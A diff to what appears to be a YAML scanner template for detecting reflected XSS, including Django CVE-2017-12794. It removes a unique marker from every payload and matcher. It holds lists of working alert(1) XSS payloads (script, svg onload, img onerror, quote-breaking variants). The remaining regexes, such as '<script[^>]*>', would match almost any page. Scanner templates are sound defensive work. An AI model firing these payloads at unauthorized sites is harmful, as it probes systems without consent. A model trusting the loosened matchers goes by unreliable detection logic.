@@ -15,6 +15,7 @@ info:
 requests:
   # CVE-2017-12794 Django XSS 特定检测
   # 注意：不能使用 %00 (NUL字符)，因为数据库会拒绝插入包含NUL的字符串
+  # 注意：用户名字段限制为 32 字符，payload 必须足够短
   - method: GET
     id: cve-2017-12794
     preconditions:
@@ -27,8 +28,8 @@ requests:
         - "<svg/onload=alert(1)>"
         - "<img src=x onerror=alert(1)>"
       default:
-        - "aegismarker<script>alert(1)</script>"
-        - "aegismarker<svg/onload=alert(1)>"
+        - "<script>alert(1)</script>"
+        - "<svg/onload=alert(1)>"
     matchers-condition: or
     matchers:
       - type: word
@@ -39,10 +40,6 @@ requests:
           - "onerror=alert(1)"
         part: body
         condition: or
-      - type: word
-        words:
-          - "aegismarker"
-        part: body
     # 排除不适用的绕过技术
     excluded_bypass_techniques:
       - null_byte_injection
@@ -83,49 +80,45 @@ requests:
       - "{{BaseURL}}/?username={{payload}}"
     payload_sets:
       default:
-        - "aegismarker<script>alert(1)</script>"
-        - "aegismarker<svg onload=alert(1)>"
-        - "aegismarker<img src=x onerror=alert(1)>"
+        - "<script>alert(1)</script>"
+        - "<svg onload=alert(1)>"
+        - "<img src=x onerror=alert(1)>"
       aggressive:
-        - "aegismarker<script>alert(1)</script>"
-        - "aegismarker<svg onload=alert(1)>"
-        - "aegismarker<img src=x onerror=alert(1)>"
-        - "aegismarker\"'><script>alert(1)</script>"
-        - "aegismarkerjavascript:alert(1)"
-        - "aegismarker<body onload=alert(1)>"
-        - "aegismarker<iframe src=javascript:alert(1)>"
-        - "aegismarker<details open ontoggle=alert(1)>"
-        - "aegismarker<audio src=x onerror=alert(1)>"
-        - "aegismarker<video><source onerror=alert(1)>"
-        - "aegismarker<marquee onstart=alert(1)>"
-        - "aegismarker<isindex action=javascript:alert(1)>"
-        - "aegismarker\"><script>alert(1)</script>"
-        - "aegismarker'><script>alert(1)</script>"
-        - "aegismarker</script><script>alert(1)</script>"
+        - "<script>alert(1)</script>"
+        - "<svg onload=alert(1)>"
+        - "<img src=x onerror=alert(1)>"
+        - "\"'><script>alert(1)</script>"
+        - "javascript:alert(1)"
+        - "<body onload=alert(1)>"
+        - "<iframe src=javascript:alert(1)>"
+        - "<details open ontoggle=alert(1)>"
+        - "<audio src=x onerror=alert(1)>"
+        - "<video><source onerror=alert(1)>"
+        - "<marquee onstart=alert(1)>"
+        - "<isindex action=javascript:alert(1)>"
+        - "\"><script>alert(1)</script>"
+        - "'><script>alert(1)</script>"
+        - "</script><script>alert(1)</script>"
       stealthy:
-        - "aegismarker"
+        - "<script>alert(1)</script>"
     matchers-condition: and
     matchers:
-      - type: word
-        words:
-          - "aegismarker"
-        part: body
       - type: regex
         regex:
-          - "aegismarker<script[^>]*>"
-          - "aegismarker<svg[^>]*onload\\s*="
-          - "aegismarker<img[^>]*onerror\\s*="
-          - "aegismarker.*?onerror\\s*=\\s*[\"']?alert"
-          - "aegismarker.*?onload\\s*=\\s*[\"']?alert"
-          - "aegismarker.*?ontoggle\\s*="
-          - "aegismarker.*?onstart\\s*="
-          - "aegismarker<iframe"
-          - "aegismarker<body[^>]*onload"
-          - "aegismarker<marquee"
-          - "aegismarker\"'><script"
-          - "aegismarker'><script"
-          - "aegismarker\"><script"
-          - "aegismarker</script><script"
+          - "<script[^>]*>"
+          - "<svg[^>]*onload\\s*="
+          - "<img[^>]*onerror\\s*="
+          - ".*?onerror\\s*=\\s*[\"']?alert"
+          - ".*?onload\\s*=\\s*[\"']?alert"
+          - ".*?ontoggle\\s*="
+          - ".*?onstart\\s*="
+          - "<iframe"
+          - "<body[^>]*onload"
+          - "<marquee"
+          - "\"'><script"
+          - "'><script"
+          - "\"><script"
+          - "</script><script"
         part: body
         condition: or
 
@@ -147,27 +140,23 @@ requests:
     body: "q={{payload}}&submit=Search"
     payload_sets:
       default:
-        - "aegismarker<script>alert(1)</script>"
-        - "aegismarker<svg onload=alert(1)>"
+        - "<script>alert(1)</script>"
+        - "<svg onload=alert(1)>"
       aggressive:
-        - "aegismarker<script>alert(1)</script>"
-        - "aegismarker<svg onload=alert(1)>"
-        - "aegismarker<img src=x onerror=alert(1)>"
-        - "aegismarker\"'><script>alert(1)</script>"
+        - "<script>alert(1)</script>"
+        - "<svg onload=alert(1)>"
+        - "<img src=x onerror=alert(1)>"
+        - "\"'><script>alert(1)</script>"
     matchers-condition: and
     matchers:
-      - type: word
-        words:
-          - "aegismarker"
-        part: body
       - type: regex
         regex:
-          - "aegismarker<script[^>]*>"
-          - "aegismarker<svg[^>]*onload\\s*="
-          - "aegismarker<img[^>]*onerror\\s*="
-          - "aegismarker.*?onerror\\s*=\\s*[\"']?alert"
-          - "aegismarker.*?onload\\s*=\\s*[\"']?alert"
-          - "aegismarker\"'><script"
+          - "<script[^>]*>"
+          - "<svg[^>]*onload\\s*="
+          - "<img[^>]*onerror\\s*="
+          - ".*?onerror\\s*=\\s*[\"']?alert"
+          - ".*?onload\\s*=\\s*[\"']?alert"
+          - "\"'><script"
         part: body
         condition: or
 
@@ -185,18 +174,14 @@ requests:
     body: '{"query": "{{payload}}", "limit": 10}'
     payload_sets:
       default:
-        - "aegismarker<script>alert(1)</script>"
-        - "aegismarker<img src=x onerror=alert(1)>"
+        - "<script>alert(1)</script>"
+        - "<img src=x onerror=alert(1)>"
     matchers-condition: and
     matchers:
-      - type: word
-        words:
-          - "aegismarker"
-        part: body
       - type: regex
         regex:
-          - "aegismarker<script[^>]*>"
-          - "aegismarker<img[^>]*onerror\\s*="
-          - "aegismarker.*?onerror\\s*=\\s*[\"']?alert"
+          - "<script[^>]*>"
+          - "<img[^>]*onerror\\s*="
+          - ".*?onerror\\s*=\\s*[\"']?alert"
         part: body
         condition: or
